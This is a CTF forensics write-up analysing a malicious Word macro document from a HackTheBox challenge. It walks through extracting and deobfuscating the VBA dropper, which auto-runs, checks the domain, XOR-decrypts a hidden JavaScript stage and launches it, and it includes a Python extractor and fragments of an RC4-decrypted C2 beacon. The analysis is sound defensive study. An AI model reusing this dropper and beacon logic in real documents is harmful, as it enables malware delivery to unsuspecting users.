...
A hard forensics challenge that is part of the Cyber Apocalypse 2024 CTF by HackTheBox

## Enumeration

## Malicious Document Analysis

We are given a zip file with a file inside called `invitation.docm`. Right away we can identify this as a macro enabled document based on the .docm extension.

Macro enabled documents allow malware authors to hide malicious commands inside a word or excel document, and execute them upon the opening of the document.

We can carve the malicious payload out of the document by utilizing `oledump.py` written by Didier Stevens. This utility can be found here: https://github.com/DidierStevens/DidierStevensSuite/blob/master/oledump.py. 

You can also read more on Object Linking and Embedding, which is the technology that allows users to insert other code into the document, here: https://en.wikipedia.org/wiki/Object_Linking_and_Embedding

First, we will identify the OLE properties contained in the document:

```bash
$ python3 oledump.py invitation.docm    
...
There isn't much here, but oledump does point us in the direction of possible malicious properties with the `M` on property `A3`.

Let's take a closer look at `VBA/NewMacros` and see if we can extract any important information:

```bash
$ python3 oledump.py -s 3 --vbadecompresscorrupt invitation.docm
...
We used the `-s` flag to specify the specific property we want to extract, as well as the `--vbadecompresscorrupt` flag which converts our output from a difficult-to-read hex dump to a more digestible form of the script, which looks like it could be the true source code of this stage of the malware.

## VBA Analysis

Let's analyze the Visual Basic code piece by piece and try to determine what it's function is - starting with the first function definition:
...
There are a few things we can learn from this function:
- First, we can see that this function takes two parameters:
	- `given_string()` as an array of Bytes
	- `length` of type Long
- This is likely a function that either encrypts or decrypts a given string using a dynamic XOR key
	- The XOR operations are performed for each byte in the given_string array
- We are given the logic that makes up the dynamic XOR key - this could be useful later...
...
We see a subroutine called AutoClose, which looks to be cleaning up after itself.

Ignoring the obvious comment, it appears as though there is some basic error handling followed by the creation of a file system object to delete all the files in a specified path `kWXlyKwVj`. This subroutine is called when the document is closed.

Paired with the comment, we can determine that there will be a JS file written to the file system which is subsequently deleted after execution.

Next, we have the AutoOpen subroutine. This subroutine will run automatically upon the document being opened, hence the AutoOpen name.
...
This is the bulk of the malware. If you are unfamiliar with Visual Basic, we can think of this as the equivalent of main() in other languages like C/C++.

This is a lot, so we will break it down even further, and substitute the obfuscated variable names with names that more closely match the function of the code.
...
This snippet ensures that the malware is executed only on the `GAMEMASTERS.local` domain by checking if the `UserDomain` is equal to to the supplied "GAMEMASTERS.local" string. 

If these are not equivalent, the malware doesn't do anything.

If they are equivalent, the malware continues with its execution.

```VBA
Dim next_file_number_available

Dim file_length As Long

Dim length As Long
file_length = FileLen(ActiveDocument.FullName)
next_file_number_available = FreeFile
Open (ActiveDocument.FullName) For Binary As #next_file_number_available
```

This snippet sets up variables for the Open function and then opens the active document `invitation.docm` as Binary

Next, the file is converted from binary into unicode characters:

```VBA
Dim file_to_convert() As Byte
ReDim file_to_convert(file_length)
Get #next_file_number_available, 1, file_to_convert

Dim command As String
file_contents = StrConv(string_to_convert, vbUnicode)
```

This string is then passed to a regex object which checks it against a hard-coded pattern for a match. If the match succeeds, it will continue with execution. If it fails, it will exit.

```VBA
Dim match, match_collection

Dim regex_object
    Set regex_object = CreateObject("vbscript.regexp")
    regex_object.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
    Set match_collection = regex_object.Execute(command)

Dim num_char_left_of_match
If match_collection.Count = 0 Then
GoTo errorExit
End If

For Each match In match_collection
num_char_left_of_match = match.FirstIndex
Exit For

Next
```

The previous block then takes the number of characters in the pattern before the match and defines a new variable to store that value for use later in the script.

Now we see where the Encrypt/Decrypt function is called:

```VBA
Dim string_to_encrypt() As Byte
Dim length As Long

length = 13082

ReDim string_to_decrypt(length)
Get #next_file_number_available, num_char_left_of_match + 81, string_to_encrypt
If Not Encrypt(string_to_decrypt(), length + 1) Then
GoTo errorExit
End If
```

This block defines the length of the payload, and the regular expression from earlier defines the offset for this file. This is then decrypted and written to a file below:

```VBA
path = Environ("appdata") & "\Microsoft\Windows"
...
Dim next_file_number_available
next_file_number_available = FreeFile
new_path = path & "\" & "mailform.js"

Open (new_path) For Binary As #next_file_number_available
Put #next_file_number_available, 1, string_to_encrypt
Close #next_file_number_available
```

Finally some cleanup and execution of the new stage:

```VBA
Erase string_to_encrypt

Set shell = CreateObject("WScript.Shell")
shell.Run """" + new_path + """" + " vF8rdgMHKBrvCoCp0ulm"  'command line
ActiveDocument.Save
Exit Sub
```
...
Armed with the information gathered from the VBA dropper, we can write a python script that extracts the JavaScript payload:

```python
import re

# function utilizing regexp to find the offset where the JS file/string is located
def find_offset(active_doc):
    # sets pattern to the hard-coded string converted to bytes rather than
    # converting the entire doc to unicode like the VBA code does
    pattern = b'sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa'

    # matches the contents of the document with the pattern to find exact
    # location of the JS file in the document
    offset = active_doc.find(pattern)
    offset = offset + len(pattern)

    return offset


def dynamic_xor_decrypt(string_to_decrypt, length):
    # Variable to store the decrypted bytes
    decrypted_string = bytearray()

    # Functionality from VBA decrypt function
    xor_key = 45
    for i in range(length):
        decrypted_string.append(string_to_decrypt[i] ^ xor_key)
        xor_key = ((xor_key ^ 99) ^ (i % 254))
    
    # returning an immutable string of bytes
    return bytes(decrypted_string)


if __name__ == '__main__':
    # opens the document as read only and bytes
    active_doc = open('invitation.docm', 'rb').read()

    # calling our find_offset function
    offset = find_offset(active_doc)
    
    # pulling the payload from the doc starting at the offset found and ending at the hard-coded length of the file/string
    payload = active_doc[offset:offset + 13082]

    payload = dynamic_xor_decrypt(payload, len(payload))
    print(payload)
```

Running our script, we have the JavaScript that the first stage drops onto the file system:
...
Like last time, there is quite a lot here. Let's try and beautify the code:
...
xR68(r, a): This function appears to be implementing a simple XOR encryption algorithm. It initializes an array t with values from 0 to 255. Then, it performs a key scheduling algorithm similar to the one used in the RC4 cipher. Finally, it XORs each byte of the input string a with bytes from the generated keystream, returning the encrypted result as a string.

Overall, these functions seem to work together to decode base64 strings and perform XOR encryption. However, without further context or usage examples, it's difficult to determine the exact purpose of this code.
```

Looks like we are dealing with Base64 encoded and RC4 encrypted output.

Taking a closer look at the beginning of the script, we can see that there is a parameter passed via the command line from the program that executed the JavaScript.

This is being passed to the RC4 decrypt function - so it is very likely that this is the encryption key.

Looking back at the VBA, we can see that there is a string provided to `shell.Run`, this is the encryption key we are looking for:
...
Now that we have the RC4 encryption key `vF8rdgMHKBrvCoCp0ulm`, we can decode and decrypt the content stored in `lyEK()`:
...
This looks like more JavaScript, let's beautify again:
...
We can see a few functions that indicate this is possibly a C2 beacon.

First we have an array that contains some common Windows commands:
...
function eRNv(caA2) {
    ...
    S47T.SETREQUESTHEADER("content-type:", "application/octet-stream");
    S47T.SETREQUESTHEADER("content-length:", "4");
    S47T.SETREQUESTHEADER("Cookie:", "flag=**************************");
    S47T.SEND("work");
    if (Z6HQ.FILEEXISTS(jpVh)) {
        Z6HQ.DELETEFILE(jpVh)
    }
...
It is here where we can find our flag, being sent as a value for the `Cookie` request header.